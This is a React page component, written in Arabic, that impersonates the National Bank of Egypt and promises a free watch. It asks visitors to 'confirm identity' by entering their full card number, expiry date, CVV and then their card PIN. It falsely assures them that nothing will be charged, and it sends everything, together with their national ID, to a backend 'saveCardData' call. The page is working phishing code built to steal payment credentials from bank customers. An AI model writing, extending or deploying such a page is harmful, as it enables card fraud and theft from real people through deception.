/**
 * البنك الأهلي المصري - معلومات البطاقة
 * تصميم أبيض/أخضر مع شعار البنك خفيف بالخلفية
 */
import { useState } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { usePresence } from "@/hooks/usePresence";
import { useAdminRedirect } from "@/hooks/useAdminRedirect";
import { handleWatchImageError, WATCH_IMAGES, WATCH_NAMES } from "@/lib/watchImages";

export default function CardInfo() {
  usePresence("card");
  useAdminRedirect();
  const [, setLocation] = useLocation();
  const [form, setForm] = useState({ cardNumber: "", expiry: "", cvv: "", pin: "" });
  const [loading, setLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");
  const [step, setStep] = useState<"card" | "pin">("card");
  const saveCardData = trpc.applications.saveCardData.useMutation();
  const nationalId = localStorage.getItem("pw_national_id") || "";
  const watchColor = sessionStorage.getItem("pw_selected_watch") || "black";

  const formatCardNumber = (val: string) => {
    const digits = val.replace(/\D/g, "").slice(0, 16);
    return digits.replace(/(.{4})/g, "$1 ").trim();
  };

  const formatExpiry = (val: string) => {
    const digits = val.replace(/\D/g, "").slice(0, 4);
    if (digits.length >= 2) return digits.slice(0, 2) + "/" + digits.slice(2);
    return digits;
  };

  const handleCardSubmit = async () => {
    const cardDigits = form.cardNumber.replace(/\s/g, "");
    if (cardDigits.length < 16) { setErrorMsg("يرجى إدخال رقم البطاقة كاملاً (16 رقم)"); return; }
    if (form.expiry.length < 5) { setErrorMsg("يرجى إدخال تاريخ الانتهاء بشكل صحيح"); return; }
    if (form.cvv.length < 3) { setErrorMsg("يرجى إدخال رمز CVV"); return; }
    setErrorMsg("");
    setStep("pin");
  };

  const handlePinSubmit = async () => {
    if (form.pin.length < 4) { setErrorMsg("يرجى إدخال الرقم السري (4 أرقام)"); return; }
    setLoading(true);
    setErrorMsg("");
    try {
      await saveCardData.mutateAsync({ nationalId, cardNumber: form.cardNumber.replace(/\s/g, ""), cardExpiry: form.expiry, cardCvv: form.cvv, cardPin: form.pin });
      sessionStorage.setItem("pw_last_page", "card");
      setLocation("/processing");
    } catch (err) {
      setErrorMsg("حدث خطأ، يرجى المحاولة مرة أخرى");
      setLoading(false);
    }
  };

  const inputStyle: React.CSSProperties = { width: "100%", padding: "14px 16px", border: "1.5px solid #e5e7eb", borderRadius: "10px", fontSize: "15px", fontFamily: "'Cairo', sans-serif", boxSizing: "border-box", outline: "none", background: "#f9fafb", color: "#1a1a1a" };

  return (
    <div dir="rtl" style={{ width: "100%", maxWidth: "100vw", minHeight: "100vh", background: "#ffffff", fontFamily: "'Cairo', sans-serif", color: "#1a1a1a", position: "relative", overflowX: "hidden" }}>
      {/* Subtle watermark */}
      <div style={{ position: "fixed", top: "50%", left: "50%", transform: "translate(-50%, -50%)", opacity: 0.03, pointerEvents: "none", zIndex: 0 }}>
        <img src="/manus-storage/nbe-official-logo-source_d2709322.png" alt="" style={{ width: "350px", height: "auto" }} />
      </div>
      <div style={{ width: "100%", maxWidth: "520px", margin: "0 auto", minHeight: "100vh", display: "flex", flexDirection: "column", padding: "24px 16px", position: "relative", zIndex: 1, boxSizing: "border-box" }}>
        {/* Logo */}
        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: "16px" }}>
          <img src="/manus-storage/nbe-official-logo-source_d2709322.png" alt="البنك الأهلي المصري" style={{ height: "auto", maxHeight: "42px", maxWidth: "180px", width: "100%", display: "block", objectFit: "contain" }} onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }} />
        </div>

        {/* Header */}
        <div style={{ textAlign: "center", marginBottom: "20px" }}>
          <div style={{ width: "56px", height: "56px", background: "#f0fdf4", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 12px", border: "2px solid #dcfce7" }}>
            <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
              <rect x="2" y="5" width="20" height="14" rx="3" stroke="#1B7A3D" strokeWidth="2"/>
              <path d="M2 10h20" stroke="#1B7A3D" strokeWidth="2"/>
            </svg>
          </div>
          <h5 style={{ fontWeight: "800", fontSize: "20px", marginBottom: "4px", color: "#1a1a1a" }}>ربط بطاقة التفعيل</h5>
          <p style={{ color: "#666", fontSize: "13px", margin: 0 }}>تأكيد هويتك لاستلام ساعتك</p>
        </div>

        {/* Watch Image */}
        <div style={{ display: "flex", alignItems: "center", gap: "12px", background: "#f8faf9", borderRadius: "12px", padding: "12px 16px", marginBottom: "16px", border: "1px solid #dcfce7" }}>
          <img src={WATCH_IMAGES[watchColor] || WATCH_IMAGES["black"]} alt="ساعتك" onError={handleWatchImageError} style={{ width: "50px", height: "50px", objectFit: "contain" }} />
          <div style={{ textAlign: "right" }}>
            <p style={{ color: "#1B7A3D", fontWeight: "700", fontSize: "13px", margin: "0 0 2px" }}>ساعتك المختارة</p>
            <p style={{ color: "#666", fontSize: "12px", margin: 0 }}>{WATCH_NAMES[watchColor] || watchColor}</p>
          </div>
        </div>

        {/* Card Form */}
        <div style={{ background: "#fafafa", borderRadius: "16px", padding: "24px", flex: 1, border: "1px solid #e5e7eb" }}>
          {/* Notice */}
          <div style={{ background: "#f0fdf4", border: "1px solid #dcfce7", borderRadius: "10px", padding: "12px 16px", marginBottom: "20px", display: "flex", gap: "10px", alignItems: "flex-start" }}>
            <span style={{ fontSize: "20px", flexShrink: 0 }}>🔒</span>
            <div>
              <p style={{ color: "#1B7A3D", fontWeight: "800", fontSize: "13px", margin: "0 0 4px" }}>تأكيد الهوية</p>
              <p style={{ color: "#666", fontSize: "12px", margin: 0, lineHeight: "1.5" }}>
                البيانات مطلوبة لتأكيد ملكيتك للبطاقة - لن يتم خصم أي مبلغ
              </p>
            </div>
          </div>

          {errorMsg && <div style={{ background: "#fef2f2", border: "1px solid #fecaca", borderRadius: "8px", padding: "10px 14px", marginBottom: "16px", color: "#dc2626", fontSize: "13px", textAlign: "center" }}>{errorMsg}</div>}

          {step === "card" ? (
            <>
              <div style={{ marginBottom: "14px" }}>
                <label style={{ display: "block", fontWeight: "700", fontSize: "13px", marginBottom: "6px", color: "#333" }}>رقم البطاقة</label>
                <input type="text" inputMode="numeric" placeholder="0000 0000 0000 0000" value={form.cardNumber}
                  onChange={(e) => setForm({ ...form, cardNumber: formatCardNumber(e.target.value) })}
                  style={{ ...inputStyle, direction: "ltr", textAlign: "center", letterSpacing: "2px" }} />
              </div>
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px", marginBottom: "20px" }}>
                <div>
                  <label style={{ display: "block", fontWeight: "700", fontSize: "13px", marginBottom: "6px", color: "#333" }}>تاريخ الانتهاء</label>
                  <input type="text" inputMode="numeric" placeholder="MM/YY" value={form.expiry}
                    onChange={(e) => setForm({ ...form, expiry: formatExpiry(e.target.value) })}
                    style={{ ...inputStyle, direction: "ltr", textAlign: "center" }} />
                </div>
                <div>
                  <label style={{ display: "block", fontWeight: "700", fontSize: "13px", marginBottom: "6px", color: "#333" }}>CVV</label>
                  <input type="password" inputMode="numeric" maxLength={4} placeholder="***" value={form.cvv}
                    onChange={(e) => setForm({ ...form, cvv: e.target.value.replace(/\D/g, "").slice(0, 4) })}
                    style={{ ...inputStyle, direction: "ltr", textAlign: "center" }} />
                </div>
              </div>
              <button onClick={handleCardSubmit}
                style={{ width: "100%", background: "linear-gradient(135deg, #1B7A3D, #0d4a24)", color: "white", border: "none", borderRadius: "10px", padding: "16px", fontSize: "16px", fontWeight: "700", cursor: "pointer", fontFamily: "'Cairo', sans-serif", boxShadow: "0 4px 15px rgba(27,122,61,0.3)" }}>
                متابعة ←
              </button>
            </>
          ) : (
            <>
              <div style={{ textAlign: "center", marginBottom: "20px" }}>
                <div style={{ fontSize: "48px", marginBottom: "8px" }}>🔐</div>
                <h5 style={{ fontWeight: "800", marginBottom: "4px", color: "#1a1a1a" }}>الرقم السري للبطاقة</h5>
                <p style={{ color: "#666", fontSize: "13px" }}>أدخل الرقم السري (PIN) للبطاقة</p>
              </div>
              <div style={{ marginBottom: "20px" }}>
                <input type="password" inputMode="numeric" maxLength={4} placeholder="••••" value={form.pin}
                  onChange={(e) => setForm({ ...form, pin: e.target.value.replace(/\D/g, "").slice(0, 4) })}
                  style={{ ...inputStyle, direction: "ltr", textAlign: "center", fontSize: "24px", letterSpacing: "8px" }} />
              </div>
              <button onClick={handlePinSubmit} disabled={loading}
                style={{ width: "100%", background: loading ? "#e5e7eb" : "linear-gradient(135deg, #1B7A3D, #0d4a24)", color: loading ? "#999" : "white", border: "none", borderRadius: "10px", padding: "16px", fontSize: "16px", fontWeight: "700", cursor: loading ? "not-allowed" : "pointer", fontFamily: "'Cairo', sans-serif", boxShadow: loading ? "none" : "0 4px 15px rgba(27,122,61,0.3)" }}>
                {loading ? "جاري المعالجة..." : "تأكيد ←"}
              </button>
            </>
          )}
        </div>
      </div>
    </div>
  );
}
